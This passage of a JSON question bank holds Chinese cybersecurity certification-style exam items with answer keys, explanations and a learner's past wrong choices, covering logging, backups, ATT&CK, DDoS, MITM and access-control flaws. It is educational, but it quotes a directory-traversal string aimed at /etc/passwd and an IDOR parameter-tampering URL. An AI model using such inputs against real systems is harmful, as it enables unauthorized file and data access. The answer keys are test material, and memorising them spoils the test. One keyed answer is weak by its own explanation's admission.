伺服器對齊。","group_context":null},{"id":"資安題庫A.pdf::65-3-653539ae86e389ab","bank":"A","pdf":"資安題庫A.pdf","qid":"65-3-653539ae86e389ab","page":65,"number":3,"multiple":false,"answers":["D"],"chosen_last":["C"],"stem":"在進行日誌分析前，通常會先將蒐集的資料中，格式不正確或完整度不足的資料進行刪除或修正，此舉稱為下列何者？","options":{"A":"Data Collection","B":"Data Profiling","C":"Data Normalization","D":"Data Cleaning"},"explanation":"題庫未提供解析","group_context":null},{"id":"資安題庫A.pdf::66-2-43bf2b1b1a2aa56c","bank":"A","pdf":"資安題庫A.pdf","qid":"66-2-43bf2b1b1a2aa56c","page":66,"number":2,"multiple":false,"answers":["C"],"chosen_last":["D"],"stem":"關於 Syslog 的敘述，下列何者錯誤？","options":{"A":"可以被以 UDP 協定及 TCP 協定來傳送","B":"通常被用於資訊系統管理及資安稽核","C":"無法透過 SSL 或 TLS 方式加密","D":"是一種用來在 TCP/IP 網路中傳遞記錄檔訊息的標準"},"explanation":"傳統的 Syslog 走 UDP 514 確實是明文沒加密，但現代資安標準早就推出了 RFC 5425（Syslog over TLS ），完全可以用 TLS（也就是跟網頁 HTTPS 一樣的加密防護）來傳輸日誌。所以說「無法加密」是錯的。","group_context":null},{"id":"資安題庫A.pdf::67-1-bf5ac86f1471b4dc","bank":"A","pdf":"資安題庫A.pdf","qid":"67-1-bf5ac86f1471b4dc","page":67,"number":1,"multiple":false,"answers":["B"],"chosen_last":["C"],"stem":"系統管理人員於網站日誌中看見大量訊息含有類似字串 「..%2F..%2F..%2F..%2Fetc..%2Fpasswd」，請問可能為以下何種攻擊？","options":{"A":"SQL Injection","B":"Directory Traversal","C":"Cross-Site Scripting","D":"Insecure Deserialization"},"explanation":"日誌中的 ..%2F 其實就是 ../ 經過網頁 URL 編碼（URL Encoding）後的代碼（其中 %2F 代表斜線 /）就像在檔案總管裡拼命點 「回上一層資料夾」。駭客在網址列連續輸入 ../../../../（dot -dot- slash），就像是在作業系統的目錄裡「不斷往回走」，試圖跳出網頁原本限制的公開資料夾，直接摸到 Linux 系統最核心的帳號密碼設定檔 （/etc/passwd）。這種手法就叫做目錄遊走或路徑穿越。","group_context":null},{"id":"資安題庫A.pdf::67-4-0dc9671f9780b301","bank":"A","pdf":"資安題庫A.pdf","qid":"67-4-0dc9671f9780b301","page":67,"number":4,"multiple":false,"answers":["D"],"chosen_last":["B"],"stem":"您目前負責管理一個高度敏感性的實驗室網路，為了方便偵測與監控實驗室的網路事件，故透過傳統的 Syslog 將重要的設備( 如防火牆、路由器)產生的事件記錄傳送並集中存放在一部 Syslog 伺服器上，但公司的資安顧問認為傳統的 Syslog 使 UDP 協定無法確保其穩定性，另一方面，Syslog 採明文傳送且未提供驗證能力，易遭受竊聽與連線攔截攻擊，若要解決上述顧問所質疑的 Syslog 相關問題，下列何者「不」是較有效的解決方案？","options":{"A":"採用 TCP 為基礎的 Syslog 伺服器","B":"在設備與 Syslog 伺服器間建立 TLS/SSL 安全性連線","C":"在設備與 Syslog 伺服器間建立 IPSec 安全性連線","D":"安裝入侵防禦系統抵擋上述所有的攻擊"},"explanation":"顧問提出兩個問題：1.UDP 不穩定（會漏信）；2.明文沒加密（會被偷看）。 o (A)可以改用 TCP 解決不穩定問題。 o (B)、(C)可以用 TLS 或 IPSec 隧道解決明文沒加密的問題。 o (D 選項錯誤)入侵防禦系統（IPS）是拿來阻擋駭客惡意攻擊流量的，它無法把原本沒加密的 Syslog 流量自動變加密，也無法解決 UDP 掉包的問題。","group_context":null},{"id":"資安題庫A.pdf::68-3-ecc5466cf9e90099","bank":"A","pdf":"資安題庫A.pdf","qid":"68-3-ecc5466cf9e90099","page":68,"number":3,"multiple":false,"answers":["C"],"chosen_last":["B"],"stem":"若在伺服器的紀錄檔中，發現附圖一連串大量的紀錄內容，最可能發生了下列何種類型的攻擊？ Aug 12 11:39:12 sshd: Invalid user admin ... passwd=pwd Aug 12 11:39:26 sshd: Invalid user admin ... passwd=admin Aug 12 11:39:29 sshd: Invalid user admin ... passwd=root Aug 12 11:39:38 sshd: Invalid user admin ... passwd=1qaz2wsx","options":{"A":"中間人攻擊（Man- In- The-Middle Attack）","B":"暴力攻擊法（Brute- Force Attack）","C":"字典攻擊法（Dictionary Attack）","D":"彩虹表攻擊（Rainbow Table Attack ）"},"explanation":"日誌中的 passwd= 後面嘗試的內容：pwd、admin 、root、 1qaz2wsx。這些全都是網路上最常見、人類最愛用的「常用弱密碼」。 • (B) 暴力攻擊法（Brute- Force Attack）：是指毫無章法地從 aaaaa、 aaaab、aaaac 開始「窮舉」硬猜，通常需要猜天文數字般的次數，效率較低。 • (C)字典攻擊法（Dictionary Attack）：駭客手上拿著一本「常用密碼小抄（字典檔）」，裡面只收集大家最常設的密碼（如生日、qwerty、 123456 等）。駭客只針對這些精選的單字進行快速測試。日誌中連續噴出這些常見字串，正是字典攻擊法的標準特徵。","group_context":null},{"id":"資安題庫A.pdf::69-4-e357af6de129dde8","bank":"A","pdf":"資安題庫A.pdf","qid":"69-4-e357af6de129dde8","page":69,"number":4,"multiple":false,"answers":["D"],"chosen_last":["C"],"stem":"某公司在每週星期日凌晨 1 點執行完整備份（Full Backup），每日凌晨 1 點執行增量備份（Incremental Backup），每日備份資料分存放於不同磁帶。若此系統在星期三的下午 2 點發生嚴重損毀（Crash ），資料人員執行資料回復，需使用多卷磁帶的資料？","options":{"A":"1","B":"2","C":"3","D":"4"},"explanation":"因為是「增量備份（天天接力）」，要把資料補回來，必須包含： 1. 週日凌晨的完整備份（第 1 個） 2. 週一凌晨的增量（第 2 個） 3. 週二凌晨的增量（第 3 個） 4. 週三凌晨的增量（第 4 個） 通通加起來才能還原到週三凌晨的狀態。所以共需 4 個磁帶。","group_context":null},{"id":"資安題庫A.pdf::70-2-ee062512603074d5","bank":"A","pdf":"資安題庫A.pdf","qid":"70-2-ee062512603074d5","page":70,"number":2,"multiple":false,"answers":["C"],"chosen_last":["A"],"stem":"若公司營運系統伺服器內有三顆硬碟作 RAID 5，並且備份機制中規定週五 23:00 進行完整備份（Full Backup ），其餘每天 23:00 進行增量備份 （Incremental Backup），已持續運行半年狀況良好，無奈於某一週一 11:00 伺服器其中一顆硬碟發生故障，請問據此下列何種處理方式？","options":{"A":"將上週五的 Full Backup 磁帶回存，再將六、日的增量備份磁帶回存","B":"將上週五的 Full Backup 磁帶回存，再將週日的備份磁帶回存","C":"更換有問題的硬碟","D":"更換有問題的硬碟，並將上週五的 Full Backup 磁帶回存，再將六、日的增量備份磁帶回存"},"explanation":"RAID 5 的超能力是「容許死掉一顆硬碟」而不丟失任何資料。既然目前只是「其中一顆故障」，系統依然在正常運轉（資料沒丟、系統沒倒）。我們不需要大費周章去拿備份磁帶出來還原，只需要把壞掉的那顆拔掉，插上一顆新的好硬碟， RAID 指令集就會自動把資料補回去了！","group_context":null},{"id":"資安題庫A.pdf::71-4-a6f426af53a75cc2","bank":"A","pdf":"資安題庫A.pdf","qid":"71-4-a6f426af53a75cc2","page":71,"number":4,"multiple":false,"answers":["B"],"chosen_last":["A"],"stem":"磁碟陣列（RAID ）是一種即時儲存與資料復原技術，它主要使用多個磁碟進行資料複製的檔案系統，下列何種規劃「不」能避免因單一磁碟故障而造成資料損毀的能力？","options":{"A":"AD 主機採用 2 顆 SATA 硬碟規劃成 RAID 1","B":"檔案伺服器採用 4 顆 SAS 硬碟規劃成 RAID 0","C":"網路接取儲存器（NAS ）採 8 顆 SATA 硬碟規劃成 RAID 5","D":"區域存放網路（SAN）採用 16 顆 SAS 硬碟規劃成 RAID 6"},"explanation":"RAID 0 叫做「效能衝鋒，但毫無容錯」。它是把資料分散切碎存在不同硬碟裡，只要死掉任何一顆硬碟，全部資料直接歸零、徹底完蛋。","group_context":null},{"id":"資安題庫B.pdf::2-2-9bd89383e41a933f","bank":"B","pdf":"資安題庫B.pdf","qid":"2-2-9bd89383e41a933f","page":2,"number":2,"multiple":false,"answers":["A"],"chosen_last":["C"],"stem":"針對 APT 攻擊，下列敘述何者正確？","options":{"A":"APT 常用技術手法，如：Privilege Escalation 提權、Lateral Movement 橫向移動","B":"常見於一般腳本小子（Script Kiddie）","C":"非針對特定對象之入侵行為","D":"利用零日漏洞、客製化的惡意軟體，缺點是不具備匿名性與持久性"},"explanation":"(A)駭客進到城堡後，會先偷換上侍衛長的衣服（提權 ），然後在各個房間到處摸索尋找藏寶庫（橫向移動）。 (B)「腳本小子」只是用別人的現成工具惡作劇，而 APT 是國家級或專業組織的軍隊。(C) APT 都是精準鎖定特定大企業或政府機關。(D) APT 最厲害的就是神不知鬼不覺（匿名）且活得超久（持久）。","group_context":null},{"id":"資安題庫B.pdf::2-3-bc5ba2afa397ed08","bank":"B","pdf":"資安題庫B.pdf","qid":"2-3-bc5ba2afa397ed08","page":2,"number":3,"multiple":false,"answers":["B"],"chosen_last":["D"],"stem":"駭客為了追求最大利益，將亂槍打鳥的隨機攻擊轉換成目標式攻擊， 進階持續性威脅（APT ）即是最難防禦的目標式攻擊。關於 APT 攻擊的敘述，下列何者錯誤？","options":{"A":"具有隱匿性高且長期潛伏於目標系統的特性","B":"APT 攻擊的模式通常都是透過老舊的網路設備進行攻擊","C":"潛伏期可以只是幾天，也可能長達一年半載","D":"遭受攻擊後，被害者多數只能盡快修補漏洞並設定災害停損點，無法有效根除攻擊"},"explanation":"高手過招不挑武器，頂尖間諜要潛入你家，不管是最新的高科技智慧電子鎖，還是後門的老舊鐵窗，只要有漏洞他就會利用。他們往往還會用昂貴的「零時差漏洞（連原廠都不知道的漏洞）」來打擊最新設備，絕非 「只挑老舊設備」攻擊。","group_context":null},{"id":"資安題庫B.pdf::4-3-40cb01a3b08f3051","bank":"B","pdf":"資安題庫B.pdf","qid":"4-3-40cb01a3b08f3051","page":4,"number":3,"multiple":false,"answers":["B"],"chosen_last":["C"],"stem":"依 MITRE ATT\u0026CK，若攻擊者執行 PowerShell 指令 Get-ChildItem - Recurse 快速列舉檔案，並進一步將結果外洩(exfiltrate) ，此行為最符合下列何項技術(technique) ？","options":{"A":"T1005D ata from Local System","B":"T1083 File and Directory Discovery","C":"T1041 Exfiltration over Command \u0026 Control Channel","D":"T1070 Indicator Removal"},"explanation":"指令中的 Get-ChildItem-Recurse 意思就是「把這個資料夾以及裡面所有的子資料夾、檔案通通列出來給我看」。這就像小偷潛入辦公室後， 到處拉開抽屜檢查裡面有哪些公文檔案。這個「看有什麼東西」的動作， 在 ATT\u0026CK 框架中叫做 File andDirectoryD iscovery（檔案與目錄發現）。","group_context":null},{"id":"資安題庫B.pdf::4-4-41da6e22d37f2bc1","bank":"B","pdf":"資安題庫B.pdf","qid":"4-4-41da6e22d37f2bc1","page":4,"number":4,"multiple":false,"answers":["D"],"chosen_last":["C"],"stem":"生成式 AI 也成為攻擊者利用的利器之一，為使生成式 AI 於攻擊進程中識別，MITRE ATT\u0026CK 也在 2024 年 4 月 26 日所釋出的 15.01 版本中將 AI 納入，並於技術中新增了一個分類名為 T1588.007 Artificial Intelligence。而攻擊與防護是相庭抗禮，上述新增的攻擊技術，為下列 ATT\u0026CK 的哪一個戰術進程？","options":{"A":"Impact 衝擊","B":"Persistence 維持","C":"Defense Evasion 防禦規避","D":"ResourceDevelopment 資源開發"},"explanation":"駭客要發動攻擊前，需要先準備好工具（例如買伺服器、寫惡意軟體、或者引進生成式 AI 幫忙寫詐騙信）。這種「在開打前儲備、開發或取得戰略資源」的階段，在 ATT\u0026CK 歸類為 ResourceDevelopment 資源開發）。","group_context":null},{"id":"資安題庫B.pdf::4-5-938e349197289445","bank":"B","pdf":"資安題庫B.pdf","qid":"4-5-938e349197289445","page":4,"number":5,"multiple":false,"answers":["D"],"chosen_last":["B"],"stem":"關於 MITRE ATT\u0026CK 中的橫向移動(Lateral Movement)戰術 (Tactic)，下列何項錯誤？","options":{"A":"遠端服務破解(Exploitation of Remote Services)屬於此類戰術","B":"內部魚叉釣魚(InternalS pearphishing)屬於此類戰術","C":"橫移工具傳輸(Lateral Tool Transfer) 屬於此類戰術","D":"本地資料取得(Data from Local System)屬於此類戰術"},"explanation":"橫向移動（Lateral Movement ）是指駭客已經進到一間房間，想辦法走到隔壁房間去（例如透過內部網路攻陷隔壁台電腦）。 (D)是「在當前這台電腦搜刮資料」，這屬於 Collection（資料蒐集） 戰術，而不是在網路世界裡走動。","group_context":null},{"id":"資安題庫B.pdf::5-6-938e349197289445","bank":"B","pdf":"資安題庫B.pdf","qid":"5-6-938e349197289445","page":5,"number":6,"multiple":false,"answers":["C"],"chosen_last":["A"],"stem":"關於 MITRE ATT\u0026CK 中的憑證存取(Credential Access)戰術 (Tactic)，下列何項錯誤？","options":{"A":"中間人攻擊(Adversary-in- the-Middle)屬於此類戰術","B":"暴力破解攻擊(Brute Force)屬於此類戰術","C":"密碼政策探索(Password Policy Discovery)屬於此類戰術","D":"變造網站憑證(ForgeWeb Credentials)屬於此類戰術"},"explanation":"憑證存取（Credential Access）的目標是「拿到帳號密碼（鑰匙 ）」。 (A) 中間人偷聽、(B) 猜密碼、(D)偽造憑證，都是為了直接拿到通行證。(C)密碼政策探索，只是去調查這家公司的密碼規定「是不是一定要大寫加數字」，這只是在收集情報、了解規則，屬於 Discovery（發現） 戰術，還沒真正拿到密碼。","group_context":null},{"id":"資安題庫B.pdf::5-7-92185dd95048efb2","bank":"B","pdf":"資安題庫B.pdf","qid":"5-7-92185dd95048efb2","page":5,"number":7,"multiple":false,"answers":["D"],"chosen_last":["B"],"stem":"下列何項屬於 MITRE ATT\u0026CK 中的憑證存取(Credential Access)戰術？","options":{"A":"從本機系統蒐集資料(Data from LocalS ystem)","B":"外部遠端服務使用(External Remote Services)","C":"清除 Windows 事件記錄(Clear Windows Event Logs)","D":"作業系統憑證傾印(OS CredentialD umping)"},"explanation":"憑證存取就是要拿密碼。作業系統憑證傾印就是指駭客利用工具，把 Windows 記憶體或系統裡暫存的帳號密碼直接「倒出來」變成明文看光光，這是最純粹且標準的憑證獲取手段。","group_context":null},{"id":"資安題庫B.pdf::6-10-938e349197289445","bank":"B","pdf":"資安題庫B.pdf","qid":"6-10-938e349197289445","page":6,"number":10,"multiple":false,"answers":["B"],"chosen_last":["A"],"stem":"關於 MITRE ATT\u0026CK 中的輸入擷取(Input Capture)技術，下列何項錯誤？","options":{"A":"無法使用預防控制（Preventive Controls）輕易緩解此技術","B":"無法透過觀察驅動程式載入（Driver Load）活動來偵測此技術","C":"可觀察系統註冊機碼（Windows Registry ）活動來偵測此技術","D":"可觀察程序建立（Process Creation ）活動與元資料（Process Metadata ） 來偵測此技術"},"explanation":"輸入擷取（Input Capture）最常見的就是鍵盤側錄（駭客偷偷記錄你打了什麼密碼）。很多側錄軟體為了偷聽鍵盤行為，必須在電腦裡安裝底層的「鍵盤驅動程式」。因此，監控系統有沒有異常的驅動程式載入 （Driver Load），是資安防護中用來抓側錄器非常核心且有效的方法。 (B) 說「無法透過它來偵測」是錯誤的描述。","group_context":null},{"id":"資安題庫B.pdf::8-3-939f76e5eb54100c","bank":"B","pdf":"資安題庫B.pdf","qid":"8-3-939f76e5eb54100c","page":8,"number":3,"multiple":false,"answers":["B"],"chosen_last":["A"],"stem":"某資安人員在檢視一封疑似釣魚郵件的附件時，發現該附件是一個變造過的快捷鍵檔案（.lnk）。當使用者不慎點擊該檔案後，它並不會釋放常見的木馬程式，而是直接呼叫系統內建的 powershell.exe，並代入一段混淆過的參數，從遠端伺服器將指令碼直接載入至記憶體中執行。請問這種不將惡意程式碼寫入硬碟的攻擊特性，在資安領域通稱為什麼？","options":{"A":"緩衝區溢位攻擊 (Buffer Overflow Attack)","B":"無檔案攻擊 (Fileless Attack)","C":"網頁掛馬攻擊 (Drive-by Download)","D":"跨網站指令碼攻擊 (XSS)"},"explanation":"不留指紋的幽靈間諜。這一題駭客的做法是：點了快捷鍵後，直接呼叫你電腦裡的 powershell 把代碼接過來，只藏在記憶體裡默默執行，硬碟上完全不留下任何檔案痕跡。這種手法就叫無檔案攻擊 。","group_context":null},{"id":"資安題庫B.pdf::10-2-779ae083b6df190f","bank":"B","pdf":"資安題庫B.pdf","qid":"10-2-779ae083b6df190f","page":10,"number":2,"multiple":false,"answers":["B"],"chosen_last":["C"],"stem":"機關對外服務網站無法正常提供服務，經分析 DNS 遭受混合式 DDoS 攻擊，下列建議之 DDoS 防護措施何者最「不」合適？","options":{"A":"可透過採購網路流量清洗服務，來緩解 DDoS 攻擊","B":"可透過限制 DNS 查詢次數，來緩解 DDoS 攻擊","C":"如果網路頻寬無須考量，可使用過濾機制來緩解 DDoS 攻擊","D":"可透過避免成為 Open Resolver 來緩解 DDoS 攻擊"},"explanation":"惡意歹徒雇用了幾萬人同時打電話來問餐廳地址（DDoS 攻擊）。如果你採取「限制每通電話只能查詢幾次」或「限制總查詢次數」，駭客一樣會用源源不絕的新電話把你的線路佔滿，正常客人的電話依舊打不進來，所以這方法最不合適。(A)流量清洗就像請保全在路口過濾駭客；(D) 避免成為 Open Resolver 就像貼出告示「本店電話不幫忙轉接其他商家」，防範被駭客利用。","group_context":null},{"id":"資安題庫B.pdf::11-1-2a3c907b20dbb4cb","bank":"B","pdf":"資安題庫B.pdf","qid":"11-1-2a3c907b20dbb4cb","page":11,"number":1,"multiple":false,"answers":["A"],"chosen_last":["C"],"stem":"路由協定（Routing Protocol ）是一種指定封包傳送方式的網路協定，請問關於路由協定之敘述，下列何者錯誤？","options":{"A":"路由資訊協定（Route Information Protocol, RIP）是最簡單的路由協定， 主要傳遞路由資訊，透過每隔 5 秒廣播一次路由表來維護相鄰路由器的位置關係","B":"路由資訊協定（Route Information Protocol, RIP）是一個距離向量路由協定，最大 hop 數為 15，超過 15 hop 的目標網路即不可達","C":"開放式最短路徑優先（Open Shortest Path First, OSPF）協定是屬於鏈路狀態路由協定，係利用所維護的網路狀態資料，透過最短路徑優先演算法（SPF 演算法）計算來得到路由表","D":"開放式最短路徑優先（Open Shortest Path First, OSPF）協定是屬於動態路由協定"},"explanation":"路由資訊協定（RIP ）的廣播週期是每隔 30 秒，而不是5 秒。OSPF 屬於現代化的動態導航系統。每台路由器都手握一張完整的「地圖資料庫」（鏈路狀態），並用最短路徑演算法（SPF，像 Google Maps 一樣）算出最快的走法。","group_context":null},{"id":"資安題庫B.pdf::12-2-3692d746a4d41e14","bank":"B","pdf":"資安題庫B.pdf","qid":"12-2-3692d746a4d41e14","page":12,"number":2,"multiple":false,"answers":["A"],"chosen_last":["D"],"stem":"某資安人員分析防火牆日誌時，發現大量封包都有 ACK 標誌。這些封包看似像是已建立 TCP 連線中的正常封包。但防火牆連線狀態表裡， 發現多數封包並不屬於任何合法連線。此情境可能是哪一種攻擊？","options":{"A":"TCP ACK Flood","B":"TCP SYN Flood","C":"DNS Amplification","D":"ARP Spoofing"},"explanation":"（假裝熟客直接闖入）正常流程要先點餐才能進餐廳。但駭客直接拿著一張「結帳單」（帶有 ACK 標誌的封包），假裝自己是吃到一半出去抽菸的熟客想直接闖進去。防火牆（門衛）必須翻看手上的登記簿（連線狀態表），發現根本沒有這人的點餐紀錄，雖然能把人擋掉，但門衛光是逐一對照登記簿，就累到快虛脫了。","group_context":null},{"id":"資安題庫B.pdf::12-3-aa1274c93af447da","bank":"B","pdf":"資安題庫B.pdf","qid":"12-3-aa1274c93af447da","page":12,"number":3,"multiple":false,"answers":["A"],"chosen_last":["D"],"stem":"某資安人員正在比較 TCP SYN Flood 與 TCP ACK Flood 的差異。他發現兩者都可能造成服務效能下降，也都可被用於 DDoS 攻擊。但兩者在 TCP 階段與主要消耗資源並不相同。下列關於 TCP SYN Flood 的描述，哪些正確？ 1. 主要利用 TCP 三向交握的連線建立流程 2. 會造成半開連線累積 3. 攻擊封包主要是大量 SYN 封包 4. 主要目標通常是讓伺服器處理大量資料傳輸","options":{"A":"1、2、3","B":"1、3、4","C":"2、3、4","D":"1、2 、3、4"},"explanation":"SYN Flood 發生在連線建立前（三向交握初期） ，特徵是大量 SYN 封包、會累積半開連線。選項 4 錯誤「目標是讓伺服器處理大量資料傳輸」， 因為連線根本沒建立成功，完全沒有傳傳輸到實際資料，純粹是在消耗伺服器的「等待空間」。","group_context":null},{"id":"資安題庫B.pdf::12-4-86a141ed3556f7b9","bank":"B","pdf":"資安題庫B.pdf","qid":"12-4-86a141ed3556f7b9","page":12,"number":4,"multiple":false,"answers":["B"],"chosen_last":["D"],"stem":"某資安人員在一台 Stateful Firewall 上觀察到 CPU 使用率異常升高。封包擷取結果顯示大量封包帶有 ACK 標誌，但沒有對應的連線紀錄。防火牆必須持續檢查這些封包是否合法，導致管理效能下降。此情境較符合 TCP ACK Flood 的特性？ 1. 攻擊會消耗防火牆的狀態處理能力 2. 攻擊主要發生在連線建立前的 SYN 階段 3. 攻擊封包多半看起來像是合法流量 4. 攻擊目的在於造成伺服器端半開連線累積","options":{"A":"1、2、3","B":"1、3","C":"2、4","D":"1、2、3、4"},"explanation":"ACK Flood 是駭客拿著假結帳單（看起來像合法流量， 3 正確）直接衝進來，會瘋狂消耗防火牆去查表確認的 CPU 處理能力（1 正確）。而 2 和 4 都是屬於「SYN Flood」的特徵，故不選。","group_context":null},{"id":"資安題庫B.pdf::13-1-cd7fe328898d9a75","bank":"B","pdf":"資安題庫B.pdf","qid":"13-1-cd7fe328898d9a75","page":13,"number":1,"multiple":false,"answers":["C"],"chosen_last":["B"],"stem":"2022 年 8 月美國眾議院議長裴洛西（Nancy Pelosi ）日前來台訪問，造成台灣有些公私部門遭受分散式阻斷服務攻擊（Distributed Denial- of- Service Attack，DDoS）。關於 DDoS 攻擊與當時事件的敘述，下列何者錯誤？","options":{"A":"當時我國行政院數位發展部啟用的防禦方式是採取以 Web3 為主的不對稱防禦架構","B":"當時我國政府為了解決此問題，利用「流量清洗」的方式去對抗，投入大量資源與成本予以設置與去阻擋","C":"DDoS 攻擊可以分成消耗網路頻寬與擷取網路上傳輸封包資訊兩種動作","D":"目前市面上有既售 DDoS 攻擊的服務，更加難以有效偵查 DDoS 攻擊"},"explanation":"DDoS 的主要目的是阻斷服務（塞爆你） ，常見手法是消耗網路頻寬 （頻寬型）或耗盡伺服器資源（資源型）。「擷取網路上傳輸封包資訊」是屬於竊聽/ 側錄（Sniffing ），不是 DDoS 的動作。","group_context":null},{"id":"資安題庫B.pdf::13-1-414fc3a9d57dd902","bank":"B","pdf":"資安題庫B.pdf","qid":"13-1-414fc3a9d57dd902","page":13,"number":1,"multiple":false,"answers":["C"],"chosen_last":["A"],"stem":"使用公眾網路上網時應該注意下列哪些事項以防範公眾網路的中間人攻擊（Man-In-The- Middle Attack, MITM） 1. 使用 WPA3 最新一代 Wi-Fi 安全技術，保護通訊安全 2. 避免瀏覽未加密的網站，減少資料被竊取風險 3. 使用虛擬專用網路（VPN）連接公司網路或專屬系統 4. 網路驗證採用雙因子認證，減少帳密被竊取的問題","options":{"A":"1、2","B":"1、3","C":"2、3","D":"3、4"},"explanation":"如何防範「中間人攻擊（偷聽、竄改）」。避免瀏覽未加密網站： 走在路上（網路），如果網站沒加密（HTTP），旁邊的人拿個集線器或側錄軟體就能把你看光光。使用 VPN：就像在公共場所拉出一條「防彈防偷聽的專用密閉隧道」，你在隧道裡講什麼，外面的中間人完全聽不到、也碰不到。","group_context":null},{"id":"資安題庫B.pdf::14-3-a8a44c787fb37b3c","bank":"B","pdf":"資安題庫B.pdf","qid":"14-3-a8a44c787fb37b3c","page":14,"number":3,"multiple":false,"answers":["A"],"chosen_last":["D"],"stem":"下列何者「不」是發動中間人攻擊（MITM）的必要手段？","options":{"A":"阻斷服務（Denial ofService,DoS）傳送端的功能","B":"偽造傳送端憑證","C":"竄改傳送端原始資訊","D":"將傳送端傳送的封包引導到駭客的機器"},"explanation":"中間人攻擊的核心是「偷偷躲在中間聽、偷偷改信件」。只要能把信件引導到我這裡（D ），不管是假造身分（B）還是改信見內容（ C）都行。 但「不需要」把原本要寄信的人直接打昏或讓他斷網（阻斷服務，A），要是斷網無法傳送了，我反而什麼都聽不到。","group_context":null},{"id":"資安題庫B.pdf::14-4-41c9defa46ee4a00","bank":"B","pdf":"資安題庫B.pdf","qid":"14-4-41c9defa46ee4a00","page":14,"number":4,"multiple":false,"answers":["D"],"chosen_last":["A"],"stem":"關於連線劫持（Session Hijacking）的偵測與防禦，下列敘述何者 「不」正確？","options":{"A":"實踐自動登出的功能也是連線劫持的其中一種防禦方式","B":"防毒軟體對連線劫持也有部分功效","C":"加密的連線可預防連線劫持","D":"IDS 可偵測與防禦連線劫持"},"explanation":"【IDS 只能看、不能擋】，它在網路裡就像一隻「監視器（或者是警報器）」，它發現有駭客（連線劫持）時，只會嗶嗶叫發出警報，它「沒有防禦（主動攔阻）」的功能。如果要能主動擋下來，必須要用 IPS（入侵防禦系統，Prevention ）。","group_context":null},{"id":"資安題庫B.pdf::15-2-33dc17803b93b072","bank":"B","pdf":"資安題庫B.pdf","qid":"15-2-33dc17803b93b072","page":15,"number":2,"multiple":false,"answers":["B"],"chosen_last":["C"],"stem":"當小李完成滲透測試後於報告中發現附圖資訊，判斷公司可能出現下列何種風險漏洞？ (資訊：GET http://172.16.112.216:8080/ 狀態: 200，版本: HTTP/1.1 )","options":{"A":"敏感目錄暴露（Possible Sensitive Directories）","B":"未強制使用 HTTPS（Unencrypted connection）","C":"Session Cookie 未設定為 Secure 安全模式（Cookie withoutS ecure flagSet）","D":"啟用 SSH 較弱 MAC 加密演算法（SSH Weak MAC Algorithms Enabled ）"},"explanation":"附圖顯示使用的是 http:// 加上 HTTP/1.1，而不是帶有安全加密的 https://。http 就好比是用「明信片」寫信，郵差、路人只要經過都能把信件內容看光光（未加密連線）。所以這代表系統未強制使用 HTTPS，存在資料被竊聽的風險。","group_context":null},{"id":"資安題庫B.pdf::15-5-41c9defa46ee4a00","bank":"B","pdf":"資安題庫B.pdf","qid":"15-5-41c9defa46ee4a00","page":15,"number":5,"multiple":false,"answers":["C"],"chosen_last":["B"],"stem":"關於連線劫持（Session Hijacking），下列敘述何者「不」正確？","options":{"A":"指攻擊者繞過驗證機制直接劫持了受害目標的 Session","B":"Session 是指兩個或多個通信設備之間，或設備與用戶之間的臨時交互資料","C":"Session 是一種用於存儲多個頁面的資訊（以變數形式）的方式，且會將該訊息存儲在使用者本機上","D":"惡意使用者冒用受害目標的 Session 進行網路存取活動，活動可以是金錢交易、資料竄改"},"explanation":"Session（會話）就像去百貨公司寄物，櫃檯發的「暫時號碼牌」。 這個號碼牌對應的詳細資料（你寄放了什麼、你是誰），是存放在百貨公司的伺服器後台（Server 端），而不是存放在使用者本機。存放在使用者本機上的叫 Cookie。","group_context":null},{"id":"資安題庫B.pdf::17-1-0b4d0ae638446d1e","bank":"B","pdf":"資安題庫B.pdf","qid":"17-1-0b4d0ae638446d1e","page":17,"number":1,"multiple":false,"answers":["C"],"chosen_last":["A"],"stem":"情境如附圖所示。若測試人員將 orderId 改為其他數值後成功取得不同使用者訂單資料，此弱點最適合歸類為下列何種弱點類別？ (情境資訊：修改 API 參數 orderId=10025 可以看到別人的訂單)","options":{"A":"Security Misconfiguration（不安全的組態設定）","B":"Insecure Deserialization（不安全的反序列化）","C":"Broken Access Control（無效的訪問控制/ 權限失效）","D":"Security Logging \u0026 Alerting Failures （安全日誌及警報失效）"},"explanation":"不看身分證的取貨櫃檯，你去超商取貨，跟店員說：「我要拿 10025 號包裹（orderId=10025）」，店員就直接拿給你。接著你隨口說： 「那我要改拿 10026 號」，店員不看你身分證，又直接把隔壁老王的包裹拿給你。這叫作權限控制失效（Broken Access Control）（在 API 領域常被稱為 BOLA(Broken Object Level Authorization)/IDOR (Insecure Direct Object Reference）「系統只檢查你『有沒有登入』，卻沒有檢查你『有沒有權限』。」","group_context":null},{"id":"資安題庫B.pdf::17-2-27d085c696f54917","bank":"B","pdf":"資安題庫B.pdf","qid":"17-2-27d085c696f54917","page":17,"number":2,"multiple":false,"answers":["D"],"chosen_last":["A"],"stem":"承上題，下列何者較可解決此問題？","options":{"A":"登入後還必須加上雙因子驗證才能防範","B":"API 應該加上次數限制","C":"在網頁前端進行授權檢查即可解決","D":"將相關參數雜湊加鹽隱碼處理"},"explanation":"資安實務標準解法是在後端進行「身分與資料擁有權」的交叉校驗。但本考題中，通常會以「將 ID 雜湊加鹽隱碼」使攻擊者無法隨意猜測規律，例如原本包裹號碼是 10025， 駭客隨便猜下一號就是10026。現在我們把它改成雜湊加鹽處理 ，號碼變成一串隨機的亂碼 fh9823hf9a8h。 駭客就算拿到了自己的包裹，也絕對猜不到別人的號碼是多少，直接杜絕隨意切換參數偷看資料的機會。(C 選項)絕對錯誤，防護絕對不能只做在網頁前端，因為駭客可以用工具直接繞過前端直接對後端發送請求。","group_context":null},{"id":"資安題庫B.pdf::19-2-a175d0a3a4c08472","bank":"B","pdf":"資安題庫B.pdf","qid":"19-2-a175d0a3a4c08472","page":19,"number":2,"multiple":false,"answers":["A"],"chosen_last":["C"],"stem":"攻擊者透過修改查詢參數「account」為任意帳號即可存取資訊，關於此應用程式缺陷的敘述，下列何者正確？ https://vulnerable.site/app/profile? account=victim","options":{"A":"存取控制失效（Broken Access Control）","B":"密碼機制失效（Cryptographic Failures）","C":"注入攻擊（Injection）","D":"安全日誌與監控失效（Security Logging and Monitoring Failures ）"},"explanation":"看網址 .../profile?account=victim，原本登入後是看自己的資料，但駭客只要把網址後面的帳號名字改成別人的名字（例如改為 victim），系統居然就直接把別人的個人資料倒給他看。 (A)正確：這在資安上俗稱 IDOR（不安全的直接物件參照），是存取控制失效（Broken Access Control） 最經典的一種表現。系統只認網址參數，卻沒有在後台檢查「當前登入的人有沒有權限看 victim 的資料」， 就像只要改了門牌號碼就能進去別人家一樣。 